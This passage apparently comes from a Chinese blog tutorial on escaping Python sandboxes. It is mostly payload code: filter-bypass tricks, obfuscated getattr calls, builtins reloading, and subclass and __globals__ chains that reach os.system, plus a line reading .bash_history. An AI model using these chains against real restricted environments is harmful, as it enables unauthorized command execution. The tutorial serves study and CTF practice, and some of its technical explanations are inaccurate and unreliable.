<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;whoami&#x27;</span><br><span class="line">list(dict(whoami=1))[0]</span><br><span class="line">str(dict(whoami=1))[2:8]</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720194250429.png"
                      alt="image-20230720194250429"
                ></p>
<h3 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:int(bool([]))、Flase、len([])、any(())</span><br><span class="line">1:int(bool([&quot;&quot;]))、True、all(())、int(list(list(dict(a၁=())).pop()).pop())</span><br><span class="line"></span><br><span class="line">len(str(&#123;&#125;.keys)) 但是需要找长度合适的字符串</span><br><span class="line"></span><br><span class="line">1.0 float(True)</span><br><span class="line"></span><br><span class="line">-1：~0</span><br><span class="line">其实通过0就可以构造出所有</span><br><span class="line">0 ** 0 == 1</span><br><span class="line">1 + 1 == 2</span><br><span class="line">2 + 1 == 3</span><br><span class="line">2 ** 2 == 4</span><br></pre></td></tr></table></figure></div>

<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>我们可以通过(),[]替换掉</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[i for i in range(10) if i == 5] </span><br><span class="line">可以替换为 </span><br><span class="line">[[i][0]for(i)in(range(10))if(i)==5]</span><br></pre></td></tr></table></figure></div>

<p>这里应该编码可以绕过，类似于php上面的空格绕过手法</p>
<h2 id="sys-modules恢复"><a href="#sys-modules恢复" class="headerlink" title="sys.modules恢复"></a>sys.modules恢复</h2><p>我们上面说sys.modules是一个字典，里面储存了加载过的模块信息，在python启动的时候，解释器会自动加载一些默认模块例如os、sys、math等，但是我们不能够直接使用，sys.modules未经inport加载的模块对当前空间是不可见的，但是我们可以通过 <code>sys.modules</code> 来使用如 sys.modules[“os”]</p>
<p>那么经过上面我们那么多种绕过对os的过滤方法，那我们可不可以直接把os模块给删除了，这样攻击者就不能调用os模块来进行命令执行</p>
<p>但是这样真的行吗？我们来尝试一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;dir&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720122459683.png"
                      alt="image-20230720122459683"
                ></p>
<p>上面我们用的是替换模块值，那我们这里直接用del删除了试试</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="line"></span><br><span class="line">del sys.modules[&#x27;os&#x27;]</span><br><span class="line">import os</span><br><span class="line">os.system(&#x27;dir&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720122635251.png"
                      alt="image-20230720122635251"
                ></p>
<p>根据运行结果我们可以看到我们用了del sys.modules[‘os’] 命令可以执行成功</p>
<p>我们上面说了，当import导入一个模块时，会先检查sys,modules里面是否已经有这个模块，如果有则不加载，如果没有则会为这个模块创建module对象并加载这个模块</p>
<p>所有我们通过del删除模块，只会让python在导入一次</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>在沙箱中最常见的就是把一下命令执行方法或者模块给ban掉。</p>
<p>这种我们在php中也很常见，我们在php中的绕过方法就是使用其他的命令执行函数</p>
<p>在python中同样存在很多可以进行命令执行和文件操作的方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">os.system(&#x27;whoami&#x27;)</span><br><span class="line">os.popen(&#x27;whoami&#x27;).read()</span><br><span class="line"># Python2</span><br><span class="line">os.popen2(&#x27;whoami&#x27;).read()</span><br><span class="line">os.popen3(&#x27;whoami&#x27;).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.check_call(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.check_output(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.Popen(&#x27;whoami&#x27;, shell=True)</span><br><span class="line"># Python3</span><br><span class="line">subprocess.run(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.getoutput(&#x27;whoami&#x27;)</span><br><span class="line">subprocess.getstatusoutput(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">platform.popen(&#x27;whoami&#x27;).read()</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">commands.getoutput(&#x27;whoami&#x27;)</span><br><span class="line">commands.getstatusoutput(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;, number=1)</span><br><span class="line"></span><br><span class="line">bdb.os.system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">cgi.os.system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br><span class="line"># Python3</span><br><span class="line">importlib.__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line">pickle.loads(b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;)</span><br><span class="line"></span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line">exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line">exec(compile(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;, &#x27;&#x27;, &#x27;exec&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Linux</span><br><span class="line">pty.spawn(&#x27;whoami&#x27;)</span><br><span class="line">pty.os.system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 文件操作</span><br><span class="line">open(&#x27;.bash_history&#x27;).read()</span><br><span class="line">linecache.getlines(&#x27;.bash_history&#x27;)</span><br><span class="line">codecs.open(&#x27;.bash_history&#x27;).read()</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">file(&#x27;.bash_history&#x27;).read()</span><br><span class="line">types.FileType(&#x27;.bash_history&#x27;).read()</span><br><span class="line">commands.getstatus(&#x27;.bash_history&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 函数参数</span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"># Python2</span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"># 函数字节码</span><br><span class="line">foo.__code__.co_code</span><br><span class="line"># Python2</span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>除了用其他命令执行函数来代替我们还可以使用<code>getattr</code> 拿到对象的方法、属性</p>
<p>我们这里先简单了解一下这个函数</p>
<p><code>getattr()</code> 是一个内置函数，用于获取对象的属性值。它接受三个参数：对象、属性名和可选的默认值。当对象拥有指定的属性时，<code>getattr()</code> 返回该属性的值；如果对象没有该属性，则可以提供默认值作为返回值。</p>
<p>语法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(object, name[, default])</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>object</code>: 要获取属性的对象。</li>
<li><code>name</code>: 属性名，一个字符串，表示要获取的属性的名称。</li>
<li><code>default</code> (可选): 如果对象没有指定的属性，则返回这个默认值。</li>
</ul>
<p>示例代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">person = &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;</span><br><span class="line">name = getattr(person, &#x27;name&#x27;)</span><br><span class="line">print(name)  # 输出: John</span><br><span class="line"></span><br><span class="line">获取类的方法：</span><br><span class="line">class MyClass:</span><br><span class="line">    def say_hello(self):</span><br><span class="line">        print(&quot;Hello, world!&quot;)</span><br><span class="line"></span><br><span class="line">method = getattr(MyClass(), &#x27;say_hello&#x27;)</span><br><span class="line">method()  # 输出: Hello, world!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>那么基于这种特性我们可以获取模块中的属性或者方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">getattr(os, &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>即使import被过滤我们仍然可以使用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(getattr(__builtins__, &#x27;__tropmi__&#x27;[::-1])(&#x27;so&#x27;[::-1]), &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720124505474.png"
                      alt="image-20230720124505474"
                ></p>
<p>那么这样的话，我们也可以通过这个手法来逃逸对import有限制的沙箱</p>
<h2 id="内置模块的应用"><a href="#内置模块的应用" class="headerlink" title="内置模块的应用"></a>内置模块的应用</h2><p>在上面我们通过getattr函数去获取模块中的属性或者方法，当import被禁用了，我们这里是通过getattr方法获取到<code>__builtins__</code>中的import。</p>
<p>但是我们可以发现我们在使用<code>__builtins_</code>并没有导入，这是因为在python中，有很多函数不需要任何import导入就可以使用。</p>
<p>这是因为python中存在一种内置模块,包含了一下常用的内置函数，和工具，在python解释器刚启动的时候内置模块就会自动加载</p>
<p>并且其中的内置功能会被添加到全局命名空间中，使得我们可以直接在任何地方使用，无需额外导入。</p>
<p>然后我们这里了解一下<code>__builtins__</code>  <code>builtins</code> <code>__builtin__</code> </p>
<p><code>__builtins__</code> 是一个在 Python 启动时创建的特殊变量，它是一个字典，它包含了所有内置的函数、异常和异常工具。在python解释器刚启动的时候，<code>__builtins__</code>模块会自动加载，并且其中的内置功能会被添加到全局命名空间中，使得我们可以直接在任何地方使用，无需额外导入，存在于python2和python3中。</p>
<p><code>builtins</code> 是 Python 3 中的内置模块，包含了所有内置的函数、异常和常用工具。在 Python 3 中，你可以使用 <code>import builtins</code> 来导入 <code>builtins</code> 模块，并使用 <code>builtins</code> 来访问其中的内置功能。</p>
<p><code>__builtin__</code> 是 Python 2 中的内置模块，与 Python 3 中的 <code>builtins</code> 扮演相同的角色。它包含了所有内置的函数、异常和常用工具。</p>
<p>关于三者的具体描述和区别可以参考这篇文章</p>
<p><a class="link"   href="https://blog.51cto.com/xpleaf/1764849" >https://blog.51cto.com/xpleaf/1764849 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们通过遍历可以看到<code>__builtins__</code>中有很多内置函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for name in dir(__builtins__):</span><br><span class="line">    print(name)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720151933663.png"
                      alt="image-20230720151933663"
                ></p>
<p>可以看到在这里面存在<code>__import__</code>、eval这些危险函数</p>
<p>但是因为<code>__builtins__</code>是一个模块，所有我们如果想要调用里面的函数，我们需要通过<code>__dict__</code>属性</p>
<ol>
<li>内置的数据类型没有 <code>__dict__</code> 属性</li>
<li>每个类有自己的 <code>__dict__</code> 属性，就算存着继承关系，父类的 <code>__dict__</code> 并不会影响子类的 <code>__dict__</code></li>
<li>对象也有自己的 <code>__dict__</code> 属性，包含 <code>self.xxx</code> 这种实例属性</li>
</ol>
<p>哪这样的话我们就可以通过<code>__builtins__</code>进行命令执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720153018926.png"
                      alt="image-20230720153018926"
                ></p>
<p>那么这样我们可以看到这个内置模块的存在很多危险函数</p>
<p>那么一些环境为了安全就会把这是内置模块中的危险方法给删除掉</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">del __builtins__.__dict__[&#x27;__import__&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;eval&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;exec&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;execfile&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;getattr&#x27;]</span><br><span class="line">del __builtins__.__dict__[&#x27;input&#x27;]</span><br></pre></td></tr></table></figure></div>

<p>但是我们可以通过重写导入内建模块，从而恢复这些内置方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">reload(__builtins__)</span><br><span class="line">python2中reload也是内建模块，可以通过del __builtins__.reload删掉。</span><br></pre></td></tr></table></figure></div>

<h2 id="利用继承关系构造逃逸链进行逃逸"><a href="#利用继承关系构造逃逸链进行逃逸" class="headerlink" title="利用继承关系构造逃逸链进行逃逸"></a>利用继承关系构造逃逸链进行逃逸</h2><p>在python中允许多重继承，当一个类继承多哥父类的时候，可能存在同名方法，为了确定方法的调用顺序。python使用mro算法来决定使用那个父类的方法</p>
<p>mro就是方法解析顺序，我们可以通过查看类的<code>__mro__</code>属性或者调用.mro来查看类的方法解析顺序。</p>
<p>示例代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class A:</span><br><span class="line">    def hello(self):</span><br><span class="line">        print(&quot;Hello from A&quot;)</span><br><span class="line"></span><br><span class="line">class B(A):</span><br><span class="line">    def hello(self):</span><br><span class="line">        print(&quot;Hello from B&quot;)</span><br><span class="line">        super().hello()</span><br><span class="line"></span><br><span class="line">class C(A):</span><br><span class="line">    def hello(self):</span><br><span class="line">        print(&quot;Hello from C&quot;)</span><br><span class="line">        super().hello()</span><br><span class="line"></span><br><span class="line">class D(B, C):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"># 查看类 D 的方法解析顺序</span><br><span class="line">mro_d = D.mro()</span><br><span class="line">print(mro_d)</span><br><span class="line"># 输出: [&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;]</span><br></pre></td></tr></table></figure></div>

<p>在 Python 中，类的实例可以通过 <code>__class__</code> 属性来获取其对应的类。这个属性指向创建该实例的类。同时，Python 3 中新式类默认继承 <code>object</code> 类，因此几乎所有的类都是 object 的子类</p>
<p>以下是关于 <code>__class__</code>、<code>__base__</code> 和 <code>__bases__</code> 的一些说明：</p>
<ol>
<li><code>__class__</code> 属性：这是一个指向类的引用，通过实例可以获取其所属的类。</li>
<li><code>__base__</code> 属性：<code>__base__</code> 是 Python 2 中的特性，它指向类的直接父类。在 Python 3 中不再使用 <code>__base__</code> 属性。</li>
<li><code>__bases__</code> 属性：<code>__bases__</code> 是 Python 2 和 Python 3 中共有的属性，它是一个元组，包含了类的所有父类。对于新式类，<code>__bases__</code> 中的第一个元素一定是 <code>object</code> 类。</li>
</ol>
<h3 id="object的子类导入危险模块"><a href="#object的子类导入危险模块" class="headerlink" title="object的子类导入危险模块"></a>object的子类导入危险模块</h3><p>如果object的子类导入了危险模块，那我们就可以链式调用危险方法</p>
<p>那么我们如何利用他进行沙箱逃逸呢？</p>
<p>我们这里还以os为例：</p>
<p>os模块被禁止导致我们不能够直接导入os模块进行使用，但是site库里面有os，那我们就可与通过site库调用os</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720155649453.png"
                      alt="image-20230720155649453"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720155737200.png"
                      alt="image-20230720155737200"
                ></p>
<p>那么只要我们能够引入site，那么我们就可以使用os</p>
<p>当然，site也可能会被禁用</p>
<p>但是正如我们在内置模块中的应用一样，我们可以通过reload重新导入，加载os</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720160914809.png"
                      alt="image-20230720160914809"
                ></p>
<p>我们上面说了，所有类都继承于object类</p>
<p>那我们可以通过<code>__subclasses__</code>查看他的子类</p>
<p>那我们这里先构造获取到object类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">[].__class__.__mro__[1]</span><br><span class="line">().__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line"># Python3</span><br><span class="line">&#x27;&#x27;.__class__.__base__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br></pre></td></tr></table></figure></div>

<p>然后我们就可以看它的子类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in enumerate(&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()): print i</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720161651311.png"
                      alt="image-20230720161651311"
                ></p>
<p>我们可以看到site也在里面</p>
<p>我们上边分析了可以通过site调用os模块</p>
<p>那我们这里就可以构造逃逸链获取到os模块</p>
<p>这里只有site的方法，那我们可以使用<code>__globals__</code>获取全局变量从而获得os</p>
<p>我们这里使用site._Printer为例来获得os</p>
<p>我们可以通过其全局变量<code>__globals__</code>获取os模块</p>
<p><code>__globals__</code></p>
<p>是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 <code>builtin_function_or_method</code> 或者是 <code>wrapper_descriptor</code> 、<code>method-wrapper</code> 类型的函数，例如 <code>range</code>、<code>range.__init__</code>、<code>&#39;&#39;.split</code> 等等</p>
<p>那我们这里可以先看一下里面有哪些函数或者方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import site</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printer_members = dir(site._Printer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for member in printer_members:</span><br><span class="line">    print(member)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我们可以通过内置函数或者这些存在site._Printer里面的函数调用<code>__globals__</code>属性获得os</p>
<p>那我们这里就可以构造逃逸链获得os：（python2中可用，py3.x 中已经移除了这里 <code>__globals__</code>）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir&#x27;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[72]._Printer__setup.__call__(eval, &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[72]._Printer__setup.__globals__[&#x27;os&#x27;]</span><br><span class="line">避免依赖于索引位置的方式来获取 _Printer 类，而是通过检查类的名称来获得对应的子类</span><br><span class="line">[i._Printer__setup.__globals__[&#x27;os&#x27;] for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_Printer&quot;]</span><br></pre></td></tr></table></figure></div>

<p>那么通过这种逃逸链我们就可以得到os模块</p>
<p>当然不只是这一种：</p>
<p><strong>warnings</strong>（python2）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import warnings</span><br><span class="line">warnings.linecache.os</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720172906065.png"
                      alt="image-20230720172906065"
                ></p>
<p>我们可用通过多重寻找的方法获取os</p>
<p>同样的我们的继承链构造为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>除了linecache，warnings里面还有一一个函数<code>warnings.catch_warnings</code>里面有_module属性</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720173705814.png"
                      alt="image-20230720173705814"
                ></p>
<p>构造逃逸链POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720174914294.png"
                      alt="image-20230720174914294"
                ></p>
<p>但是上面说的都是在python2中才能使用，python 3<code>warnings</code>中的<code>linecache</code>被删除了</p>
<p>所有我们无法使用上面的方法</p>
<p>但是在python3中有<code>__builtins__</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720180216542.png"
                      alt="image-20230720180216542"
                ></p>
<p>而且还存在一个os._wrap_close</p>
<p>那么我们就可用构造逃逸链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)</span><br><span class="line">或者:</span><br><span class="line">[i for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_wrap_close&quot;][0].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)</span><br><span class="line">或</span><br><span class="line">set.mro()[-1].__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)</span><br><span class="line">或者直接使用object</span><br><span class="line">object.__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>



<h3 id="object子类导入危险方法"><a href="#object子类导入危险方法" class="headerlink" title="object子类导入危险方法"></a>object子类导入危险方法</h3><p>如果object的的子类导入了危险方法，那我们就可以调用子类的危险方法</p>
<p>例如object的子类builtin_function_or_method中导入了<code>__call__</code>方法</p>
<p>构造逃逸链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3</span><br><span class="line">object.__subclasses__()[7].__call__(eval, &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line"></span><br><span class="line">python2</span><br><span class="line">object.__subclasses__()[29].__call__(eval, &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="利用异常逃逸"><a href="#利用异常逃逸" class="headerlink" title="利用异常逃逸"></a>利用异常逃逸</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hack = lambda : [0][1]</span><br><span class="line">try:</span><br><span class="line">    hack()</span><br><span class="line">except Exception as e:</span><br><span class="line">    e.__traceback__.tb_next.tb_frame.f_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>这一部分参考文章上面是写了，但是我本地并没有复现成功</p>
<h3 id="利用format"><a href="#利用format" class="headerlink" title="利用format"></a><strong>利用format</strong></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&#123;0.__class__.__base__&#125;&quot;.format([])</span><br><span class="line">&quot;&#123;x.__class__.__base__&#125;&quot;.format(x=[])</span><br><span class="line">&quot;&#123;.__class__.__base__&#125;&quot;.format([])</span><br><span class="line">(&quot;&#123;0.__class_&quot;+&quot;_.__base__&#125;&quot;).format([])</span><br></pre></td></tr></table></figure></div>

<p>分析：</p>
<ol>
<li><p><code>&quot;&#123;0.__class__.__base__&#125;&quot;.format([])</code>: 这个代码将一个空列表 <code>[]</code> 作为参数传递给 <code>format</code> 方法，然后使用 <code>&#123;&#125;</code> 来进行字符串格式化。在这里，<code>0</code> 表示参数列表的第一个元素，也就是空列表 <code>[]</code>。<code>__class__</code> 是获取对象的类，而 <code>__base__</code> 则是获取类的基类。因此，这个代码的结果是输出 <code>list</code> 类的基类，也就是 <code>object</code>。</p>
</li>
<li><p><code>&quot;&#123;x.__class__.__base__&#125;&quot;.format(x=[])</code>: 这个代码与第一个类似，只是使用了命名参数 <code>x</code> 来表示传递的空列表 <code>[]</code>。在这里，<code>x</code> 对应传递的参数，即空列表 <code>[]</code>。因此，这个代码的结果同样是输出 <code>list</code> 类的基类，也就是 <code>object</code>。</p>
</li>
<li><p><code>&quot;&#123;.__class__.__base__&#125;&quot;.format([])</code>: 这个代码中使用了 <code>.</code> 来表示格式化的位置，表示传递的参数在格式化字符串之外。在这里，空列表 <code>[]</code> 是作为参数传递给 <code>format</code> 方法，而 <code>.</code> 则表示使用该参数进行格式化。因此，这个代码的结果同样是输出 <code>list</code> 类的基类，也就是 <code>object</code>。</p>
</li>
<li><p><code>(&quot;&#123;0.__class_&quot;+&quot;_.__base__&#125;&quot;).format([])</code>: 这个代码的逻辑与第一个相同，只是字符串拼接使用了字符串连接符 <code>_</code>。由于在 <code>&#123;&#125;</code> 内不能直接使用 <code>_</code>，所以需要分开写。结果同样是输出 <code>list</code> 类的基类，也就是 <code>object</code>。</p>
</li>
</ol>
<h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>在参考文章上面，有一个很好的总结，这里借用一下：</p>
<p>以下是构造逃逸链的思路：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路一：如果object的某个派生类中存在危险方法，就可以直接拿来用</span><br><span class="line"></span><br><span class="line">思路二：如果object的某个派生类导入了危险模块，就可以链式调用危险方法</span><br><span class="line"></span><br><span class="line">思路三：如果object的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用</span><br><span class="line"></span><br><span class="line">思路四：基本类型的某些方法属于特殊方法，可以通过链式调用</span><br></pre></td></tr></table></figure></div>

<p>然后文章上面也给出了获得poc的代码：</p>
